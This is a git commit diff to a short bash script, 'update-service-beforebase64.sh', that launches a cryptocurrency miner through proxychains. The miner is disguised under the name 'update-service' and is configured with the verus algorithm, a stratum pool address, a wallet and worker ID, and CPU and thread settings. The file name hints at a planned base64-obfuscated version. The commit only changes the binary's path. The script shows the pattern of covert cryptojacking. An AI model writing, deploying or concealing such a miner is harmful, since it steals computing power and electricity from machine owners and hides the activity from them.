6490f7e55535059220a41a42c3d3a015f489ebc2
irruzzz07 <shopping.outsider@gmail.com>
2025-01-05 11:27:36 +0800

    Update update-service-beforebase64.sh

--- update-service-beforebase64.sh
+++ update-service-beforebase64.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-proxychains ./root/update-service/update-service -a verus -o stratum+tcp://usw.vipor.net:5040 -u RBufqygvWTYxnk1tHn1uaDt8onzjTuBJSb.OCIUS001 -p x --cpu-priority 2 -t 4
+proxychains ./update-service/update-service -a verus -o stratum+tcp://usw.vipor.net:5040 -u RBufqygvWTYxnk1tHn1uaDt8onzjTuBJSb.OCIUS001 -p x --cpu-priority 2 -t 4
